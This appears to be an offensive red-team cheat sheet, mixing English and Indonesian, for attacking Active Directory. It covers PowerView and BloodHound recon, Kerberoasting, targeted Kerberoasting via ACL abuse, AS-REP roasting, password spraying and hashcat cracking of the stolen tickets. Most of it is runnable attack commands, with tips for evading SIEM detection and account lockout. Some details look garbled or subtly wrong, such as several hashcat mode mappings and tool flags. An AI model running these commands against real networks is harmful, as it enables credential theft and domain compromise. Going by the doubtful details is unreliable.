# ad-kerb — ad

# AD Recon & Kerberos — Red Team Reference

## 1. Recon & Collection

### 1.1 PowerView (PowerSploit / dev branch, ~2024 fork)

What is sent: LDAP bind + query to the DC (389/636), RPC/SAMR for local enumeration.
What appears: AD objects + attributes; CSV/console output.

```powershell
Import-Module .\PowerView.ps1
# Domain/forest context
Get-Domain -Domain corp.local
Get-DomainController -Domain corp.local
Get-ForestDomain

# Users — target kelas service (unconstrained/constrained delegation, SPN, adminCount)
Get-DomainUser -SPN | select samaccountname,serviceprincipalname,admincount,useraccountcontrol,pwdlastset
Get-DomainUser -Properties samaccountname,description,memberof | ? {$_.description -match "pass"}
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD,TRUSTED_FOR_DELEGATION,TRUSTED_TO_AUTH_FOR_DELEGATION

# Kerberoastable (SPN set, bukan krbtgt)
Get-DomainUser -SPN -AdminCount | select samaccountname,serviceprincipalname

# AS-REP roastable (DONT_REQ_PREAUTH = 0x400000)
Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol

# Computers — LAPS, unconstrained delegation (TRUSTED_FOR_DELEGATION = 0x80000)
Get-DomainComputer -Unconstrained | select dnshostname,useraccountcontrol
Get-DomainComputer -Properties dnshostname,ms-Mcs-AdmPwd

# Groups & ACL
Get-DomainGroup -MemberIdentity "Domain Admins" -Recurse
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner|ForceChangePassword|GenericWrite"}

# Sessions / local admin (RPC/SAMR)
Find-DomainUserLocation -UserIdentity svc_sql
Find-LocalAdminAccess -Verbose
```

Field output penting: `samaccountname`, `serviceprincipalname`, `useraccountcontrol` (bit 0x400000 = no preauth, 0x800000/0x1000000 = delegation flags), `admincount=1`, `pwdlastset`, `msds-allowedtodelegateto`, `ms-mcs-admpwd`.

Why it works: LDAP anonymous/authenticated read is default in AD. Fails if `RestrictQueryGroup` is hardened, or auditing 4662/5136 is noisy and timing is not randomized.

### 1.2 BloodHound CE (v6+/v7) — SharpHound v2.6+

What is sent: LDAP + SAMR + RPC (NetSessionEnum, NetWkstaUserEnum, NetLocalGroupGetMembers) + remote registry (if enabled).
What appears: `*.zip` containing `*.json` collection; ingest to Neo4j → edge graph.

```powershell
# All collections, stealthy default
SharpHound.exe -c All --zipfilename corp_bh.zip
SharpHound.exe -c DCOnly                                   # minimal noise, hanya DC
SharpHound.exe -c Session,LoggedOn --Loop --LoopDuration 02:00:00
SharpHound.exe -c All --Throttle 2000 --Jitter 30          # rate-limit evasion
```

Kolektor alternatif (Linux, no .exe on disk):
```bash
bloodhound-python -u user -p 'Passw0rd!' -d corp.local -ns 10.0.0.10 -c All --zip
```

Key Cypher queries (BloodHound CE):
```cypher
// Kerberoastable dengan path ke DA
MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
// AS-REP roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
// Unconstrained delegation hosts
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
// ACL abuse: GenericAll/WriteDACL ke Tier0
MATCH p=(u:User)-[:GenericAll|WriteDACL|Owns|ForceChangePassword]->(t) WHERE t.highvalue=true RETURN p
```

Edge output penting: `HasSession`, `AdminTo`, `GenericAll`, `WriteDACL`, `ForceChangePassword`, `AddMember`, `AllowedToDelegate`, `AllowedToAct`, `DCSync`, `GetChanges/GetChangesAll`, `CanRDP`, `CanPSRemote`.

Why it works: authenticated read query + anonymous/authenticated RPC. Fails if: SMB signing + `RestrictRemoteSAM` is hardened (`Network access: Restrict clients allowed to make remote calls to SAM`), firewall blocks 445/135, or `NetSessionEnum` is ACL'd (common in modern hardening).

---

## 2. Kerberoasting

What is sent: `AS-REQ` without preauth (normal) → `TGS-REQ` for the target SPN with `rc4-hmac` (0x17) or `aes256-cts-hmac-sha1-96` (0x12) encryption.
What appears: `TGS-REP` containing `enc-part` = hash that can be cracked offline.
Why it works: service account passwords are usually weak/static, and the ticket is encrypted with a key derived from that account's password — not a session secret.

**Important rule**: preauth `-rc4` is only possible if the account has `msDS-SupportedEncryptionTypes` allowing RC4 or it is not set (default: RC4+AES). If set to AES-only (0x18/0x30 with the RC4 bit off), you get `etype 18` → crack with mode 19700/19800 (slower).

### 2.1 GetUserSPNs.py (Impacket ≥ 0.12)

```bash
# Enumerate SPN tanpa request (recon)
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10

# Request semua TGS sebagai RC4 (default pada banyak build)
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request -outputfile spn.hashes

# Paksa RC4 eksplisit (flag persis)
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request -request-user svc_sql -outputfile svc_sql.hash

# Paksa AES256 (kalau RC4 diblok, dapat etype 18)
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request -request-user svc_sql --aes

# Auth via NTLM hash (PtH)
GetUserSPNs.py -hashes :NTHASH corp.local/jdoe -dc-ip 10.0.0.10 -request

# Targeted (single user)
GetUserSPNs.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request-user svc_iis -outputfile svc_iis.hash
```

Exact flags that are often misquoted:
- `-request` (not `--request-tgs`); required for the TGS to be sent.
- `-request-user <SAM>`, but must not be semantically combined with the automatic SPN filter — use the `-usersfile` filter when there are many.
- `-outputfile` (a single dash in modern impacket maps to `--outputfile`).
- `-target-domain` + `-dc-ip` different domain for cross-trust.
- `-no-pass` for ticket-only Kerberos auth.

Format output (hashcat 13100):
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$<checksum>$<edata>
```
Field penting: `23` = etype RC4 (13100). Bila `18` = AES256 (mode 19700); `17` = AES128 (mode 19600).

### 2.2 Rubeus (v2.3.x)

```powershell
# Kerberoast, output hashcat format
.\Rubeus.exe kerberoast /outfile:spn.txt /format:hashcat

# Hanya user target, paksa RC4, opsec-friendly
.\Rubeus.exe kerberoast /user:svc_sql /rc4opsec /outfile:svc_sql.txt /format:hashcat

# Request via alternate cred
.\Rubeus.exe kerberoast /creduser:corp.local\jdoe /credpassword:Passw0rd! /outfile:spn.txt

# Statistik
.\Rubeus.exe kerberoast /stats

# AES (jika target AES-only; crack lebih lambat mode 19700)
.\Rubeus.exe kerberoast /user:svc_sql /aes /outfile:svc_sql_aes.txt /format:hashcat
```

Exact flags that are often wrong:
- `/rc4opsec` = do not request RC4 for accounts that `msDS-SupportedEncryptionTypes` forbids (avoiding anomalous event 4769).
- `/tgtdeleg` = use delegated TGT (GSS-API) → TGS from LSA without explicit creds. Useful when you don't have plaintext.
- `/nowrap` = do not wrap the prompt.
- `/format:hashcat` = prefix `$krb5tgs$`; without this, default is `john`.

### 2.3 Targeted Kerberoast for privesc via ACL

What is sent: `SetSPN`/`WriteProperty` to the `servicePrincipalName` attribute on the target (victim) account via the `GenericAll`/`GenericWrite` ACL we hold, then TGS-REQ to that SPN, crack → reset the victim's password → pivot.
Why it works: write access to `servicePrincipalName` is enough to make the target roastable.

PowerView:
```powershell
# Cek ACL kita ke target
Get-DomainObjectAcl -Identity victim_user -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll"}
# Set SPN (targeted kerberoast)
Set-DomainObject -Identity victim_user -Set @{serviceprincipalname='nonexistent/whatever'} -Verbose
# Roast
.\Rubeus.exe kerberoast /user:victim_user /nowrap /format:hashcat
# Bersihkan (penting buat opsec)
Set-DomainObject -Identity victim_user -Clear serviceprincipalname
```

Impacket alternative (from Linux, without PowerView):
```bash
targetedKerberoast.py -d corp.local -u jdoe -p 'Passw0rd!' --dc-ip 10.0.0.10 -o hashes.txt
# Output: $krb5tgs$23$*victim_user$CORP.LOCAL$nonexistent/whatever*$...
```

First check whether the target already has an existing SPN (if so, no need to set one). Do not set an SPN on the `krbtgt` account, a DC `computer$`, or Tier0 accounts without written authorization — events 4742/5136 are immediately suspicious.

---

## 3. AS-REP Roasting

What is sent: `AS-REQ` with `preauth` **not** included for a `DONT_REQ_PREAUTH` user.
What appears: `AS-REP` containing `enc-part` = hash encrypted with a key derived from the user's password.
Why it works: preauth off → the DC directly sends encrypted material without proof of identity.

```bash
# Impacket — enumerate & roast
GetNPUsers.py corp.local/ -dc-ip 10.0.0.10 -usersfile users.txt -format hashcat -outputfile asrep.hashes
GetNPUsers.py corp.local/jdoe:'Passw0rd!' -dc-ip 10.0.0.10 -request -outputfile asrep.hashes
# Tanpa auth (anonymous bind bisa jalan di banyak forest legacy)
GetNPUsers.py corp.local/ -dc-ip 10.0.0.10 -no-pass -usersfile users.txt
```

Exact flags: `-request` = send AS-REQ without preauth; without this it only enumerates. `-format hashcat` creates the `$krb5asrep$` prefix. `-usersfile` is required (or `-request` for a single user via `-request-user`).

```powershell
# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\Rubeus.exe asreproast /user:noauth_user /nowrap /format:hashcat
.\Rubeus.exe asreproast /domain:corp.local /dc:dc01.corp.local
```

Format output (hashcat 18200):
```
$krb5asrep$23$noauth_user@CORP.LOCAL:<checksum>$<edata>
```
Bila `18` = AES256 (mode 19900), `17` = AES128 (mode 19800).

Why it fails in the field:
- `GetNPUsers.py` uses `-usersfile` in a completely different string mode from `-request-user`; mixing flags → argparse error.
- Microsoft pushes the `Kerberos policy: Do not require Kerberos preauthentication` = disabled policy, plus detection of 4768 with `PreAuthType=0`. In new forests (2016+ default), there are almost no AS-REP-able accounts.
- Hashcat 18200 butuh password `>= 1 char`; empty password tetap butuh mask minimal.

---

## 4. Password Spraying — SprayHound

What is sent: one password (or a few) to many accounts with delays — avoiding lockout.
What appears: `VALID`/`INVALID`/`LOCKED`/`EXPIRED` status in the output; optional bloodhound-ingest.

```bash
# SprayHound (versi Go, v0.2+)
sprayhound -U users.txt -p 'Spring2025!' -d corp.local --dc-ip 10.0.0.10 --delay 2h --jitter 30 --safe

# Multiple passwords, satu putaran
sprayhound -U users.txt -P passwords.txt -d corp.local --dc-ip 10.0.0.10 --delay 30m --stop-on-lockout 1

# Ingest ke BloodHound
sprayhound -U users.txt -p 'Spring2025!' -d corp.local --dc-ip 10.0.0.10 --outfile bh_results.zip --bloodhound

# Auth via NTLM hash (pth spray)
sprayhound -U users.txt -H <NTHASH> -d corp.local --dc-ip 10.0.0.10 --delay 1h
```

Exact flags that are often wrong:
- `--safe` (sprayhound) = automatically stops when `badPwdCount + 1 == lockoutThreshold – 1` per account; requires read to `ms-DS-MachineAccountQuota`? no — requires access to the lockoutPolicy attribute via LDAP (default authenticated read).
- `--stop-on-lockout N` is event-based: stops if `N` accounts return `LOCKED`.
- `--delay` + `--jitter` = interval between requests per account; at least >> the `LockoutObservationWindow` window (default 30 minutes).
- `--bloodhound` = emit CE-compatible JSON (not a zip directly).

Alternatif:
```bash
# domain_password_spray (Python, lebih lambat, deteksi 4625)
python3 spray.py -U users.txt -p 'Spring2025!' -d corp.local --dc 10.0.0.10 --attempts 1 --sleep 30

# crackmapexec / nxc (spray file)
nxc smb dc01.corp.local -u users.txt -p 'Spring2025!' --continue-on-success --no-bruteforce
```

Operational rule: **1 password per account per lockout window** (AD default: threshold 5–10, window 30 minutes, duration 30 minutes). SprayHound default `--safe` sends 1 attempt per user per run. Do not loop < window.

Important output fields: `username`, `status` (VALID/INVALID/LOCKED/EXPIRED/CHANGE_PASSWORD), `lockoutThreshold`, `remainingAttempts`. Valid → immediately save to `valid-users.txt`; do not re-spray within the same window.

Why it fails in the field:
- `--jitter` is in seconds, not percent; wrong setting → burst.
- NTLM hash spray (PtH) tetap menaikkan `badPwdCount` → lockout sama saja.
- Account lockout policy in granular per-OU GPO (FGPP) → threshold is stricter than expected; sprayhound `--safe` only reads the global `lockoutThreshold`.
- Smart lockout Microsoft Entra ID (cloud) is not visible from domain policy; spray to ADFS/Entra → cloud lockout, 2 attempts remaining.

---

## 5. Cracking (Hashcat)

### 5.1 Kerberoast RC4 — `-m 13100`

```bash
# Wordlist + rules
hashcat -m 13100 -a 0 spn.hashes /usr/share/wordlists/rockyou.txt -r rules/best64.rule -O -w 4

# Mask (8 chars, uppercase+lower+digit)
hashcat -m 13100 -a 3 spn.hashes ?u?l?l?l?l?d?d?d -O -w 4

# Kombinasi (wordlist + mask append)
hashcat -m 13100 -a 6 spn.hashes rockyou.txt ?d?d -O -w 4

# Resume + potfile
hashcat -m 13100 spn.hashes --potfile-path=./k.hc.pot --status --status-timer=30
```

Format hash persis (RC4):
```
$krb5tgs$23$*USER$REALM$SPN*$<32hex checksum>$<hex edata>
```
`23` = etype 23 (RC4). Crack = derivasi NT hash → RC4 key → dekripsi edata, cek checksum.

Rule: if `msDS-SupportedEncryptionTypes` = 0x18 (AES128+AES256) or 0x30 (RC4+AES128+AES256 minus RC4 0x4 bit → 0x38/0x30 variant), hashcat 13100 **fails to parse**; use `-m 19700` (AES256) / `-m 19600` (AES128).

### 5.2 AS-REP RC4 — `-m 18200`

```bash
hashcat -m 18200 -a 0 asrep.hashes rockyou.txt -r rules/best64.rule -O -w 4
hashcat -m 18200 -a 3 asrep.hashes ?a?a?a?a?a?a?a?a -O -w 4 --increment
```

Format hash persis:
```
$krb5asrep$23$USER@REALM:<32hex checksum>$<hex edata>
```
`23` = RC4. Crack = PBKDF2-HMAC-MD4 (or RC4 directly), decrypt, verify checksum.

Related modes:
| etype | Kerberoast | AS-REP |
|-------|-----------|--------|
| 23 (RC4) | `-m 13100` | `-m 18200` |
| 18 (AES256) | `-m 19700` | `-m 19900` |
| 17 (AES128) | `-m 19600` | `-m 19800` |

### 5.3 Named pitfalls hashcat

- `-O` (optimized kernel) rejects passwords >32 chars for some modes → remove `-O` if there are long passwords.
- `--username` is not needed; hashcat already parses the `$krb5...` prefix.
- `-m 13100` vs `-m 13100 -O`: `-O` truncates `candidate password length` to 31; `--increment` is not compatible with `-O` for some modes.
- Cracking the dual SHA-1 base hash (AES modes) is much slower (10–100× RC4); AES-only target → prioritize targeted masks, not rockyou.
- Hashcat `-w 4` + `-O` = ~2× speed but +5–10 °C; in a GPU passthrough VM (RTX 4090 ~3.5 GH/s @ 13100, ~3.6 MH/s @ 19700). These numbers vary by driver/CUDA 12.x.

---

## 6. Operational Pitfalls — What Makes This Technique Fail in the Field

1. **RC4 disabled domain-wide.** Many 2022+ forests set `msDS-SupportedEncryptionTypes = 0x18` for service accounts, plus GPO `Network security: Configure encryption types allowed for Kerberos` without RC4. Result: `GetUserSPNs.py -request` returns etype 18, hashcat 13100 errors with `No hash-mode matches`, and AES256 crack time = 10–100× longer. Check the etype in the hash first (`$krb5tgs$23` vs `$18`).

2. **Preauth required globally.** New forests default `Kerberos policy` closes empty AS-REP. `GetNPUsers.py` returns `UF_DONT_REQUIRE_PREAUTH` empty. Don't waste time — scan `useraccountcontrol` first in PowerView.

3. **AES-only + long service passwords.** Service passwords 25+ random chars → RC4 is rare. Targeted kerberoast wins only if you have write access to `servicePrincipalName` on an account with a weak password (usually IT-helpdesk or legacy `svc_*`).

4. **Granular lockout (FGPP).** Domain policy = 5, but Finance OU = 3. SprayHound `--safe` reads only the global domain policy → still locks out. Before spraying, `Get-ADFineGrainedPasswordPolicy` / `msDS-PSOApplied` per target.

5. **`RestrictRemoteSAM`.** Windows 10 1809+ default `Network access: Restrict clients allowed to make remote calls to SAM = Administrators: Remote access allowed`. SharpHound `NetSessionEnum`/`NetLocalGroupGetMembers` returns `ERROR_ACCESS_DENIED`; sessions/AdminTo disappear from the graph. Fallback: `PowerView Find-DomainUserLocation` via RPC (will also fail), so rely on logon events 4624 (requires privilege).

6. **SMB signing + SMBv1 off + firewall.** The session column (`HasSession`) requires RPC/SMB 445 to the workstation. In isolated user→server VLAN segments (common in 2023+ networks), SharpHound `-c All` returns an empty zip for sessions. Set `-c DCOnly` + `-c Session` separately, run from a jump host in each VLAN.

7. **4769/4768 auditing alerting SIEM.** The volume of `GetUserSPNs.py -request` from a single source IP gets caught by the "Kerberoasting burst" rule. Opsec mitigation: rate limit between requests (`--delay 60`), rotate source via SOCKS proxy (`proxychains`), and don't use `-request` to enumerate + roast in one run.

8. **Event 4742 (computer/user mod) from targeted kerberoast.** Setting/clearing an SPN triggers 4742 on that object and 5136 on the DC. Don't forget to clear the SPN afterward; but the event is still logged. Do it only on accounts whose owner/ACL doesn't monitor that object.

9. **GetUserSPNs.py and PKINIT username format.** Use `corp.local/user:pass` **without** `@corp.local` in the username, and always explicit `-dc-ip`. Without `-dc-ip`, DNS resolution may go to another site's DC / port filter → `socket.timeout`.

10. **Hashcat `-O` vs cost.** Mode 13100 `-O` truncates length, but mode 19700 `-O` actually conflicts — no optimized kernel available. Check `hashcat -b -m 19700` once before the batch.

11. **Rubeus `/rc4opsec` false safety.** This flag only avoids RC4 if `msDS-SupportedEncryptionTypes` is present; if the attribute is empty (default = RC4+AES), Rubeus still requests RC4 → 4769 with etype 0x17. Truly opsec only if you read the attribute first and skip AES-only accounts.

12. **SprayHound `--bloodhound` ingest.** Outputs CE-format JSON but doesn't write a zip; BloodHound CE v6+ needs a zip or manual upload. This is one of the "exact flags" often misquoted — `--outfile x.zip` does **not** automatically become ingest format; run `zip -r spray_bh.zip *.json` manually.

13. **Rubeus one-liner on systems with Credential Guard / LSA protection (Windows 11 24H2 + HVCI).** `/tgtdeleg` fails to get into LSA → `KRB_AP_ERR_MODIFIED`. Requires an interactive non-restricted token; often not possible via C2 injection into a user process.

14. **Impacket version.** Old `GetUserSPNs.py` (<0.9) doesn't support `--aes` and misparses etype 18. Use 0.12.0+. Likewise `targetedKerberoast.py` requires `ldap3 >= 2.9`.

---

## [reasoning trace]


